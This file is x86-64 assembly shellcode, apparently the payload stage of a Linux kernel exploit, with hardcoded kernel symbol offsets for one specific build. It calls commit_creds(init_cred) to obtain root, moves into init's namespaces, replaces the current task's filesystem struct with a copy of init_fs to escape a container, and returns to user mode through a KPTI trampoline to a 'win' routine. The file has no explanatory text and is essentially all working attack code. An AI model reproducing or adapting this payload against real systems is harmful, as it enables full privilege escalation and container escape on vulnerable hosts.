
  init_cred         equ 0x2a76b00
  commit_creds      equ 0x1c2670
  find_task_by_vpid equ 0x1b8fa0
  init_nsproxy      equ 0x2a768c0
  switch_task_namespaces equ 0x1c0ad0
  init_fs                equ 0x2bb5320
  copy_fs_struct         equ 0x45c0f0
  ; swapgs_restore_regs_and_return_to_usermode + 22
  ;kpti_bypass            equ 0x14011a6
  kpti_bypass            equ 0x14011c6

[BITS 64]

section .text
global _start    ; Entry point

_start:
  endbr64
  call a
a:
  pop r15
  sub r15, 0x42cc49

  ; commit_creds(init_cred) [3]
  lea rdi, [r15 + init_cred]
  lea rax, [r15 + commit_creds]
  call rax

  ; task = find_task_by_vpid(1) [4]
  mov edi, 1
  lea rax, [r15 + find_task_by_vpid]
  call rax

  ; switch_task_namespaces(task, init_nsproxy) [5]
  mov rdi, rax
  lea rsi, [r15 + init_nsproxy]
  lea rax, [r15 + switch_task_namespaces]
  call rax

  ; new_fs = copy_fs_struct(init_fs) [6]
  lea rdi, [r15 + init_fs]
  lea rax, [r15 + copy_fs_struct]
  call rax
  mov rbx, rax

  ; current = find_task_by_vpid(getpid())
  mov rdi, 0x1111111111111111   ; will be fixed at runtime
  lea rax, [r15 + find_task_by_vpid]
  call rax

  ; current->fs = new_fs [8]
  ; DIFFERS between kernel versions
  mov [rax + 0x828], rbx

  ; kpti trampoline [9]
  xor eax, eax
  mov [rsp+0x00], rax
  mov [rsp+0x08], rax
  mov rax, 0x2222222222222222   ; win
  mov [rsp+0x10], rax
  mov rax, 0x3333333333333333   ; cs
  mov [rsp+0x18], rax
  mov rax, 0x4444444444444444   ; rflags
  mov [rsp+0x20], rax
  mov rax, 0x5555555555555555   ; stack
  mov [rsp+0x28], rax
  mov rax, 0x6666666666666666   ; ss
  mov [rsp+0x30], rax
  lea rax, [r15 + kpti_bypass]
  jmp rax

  int3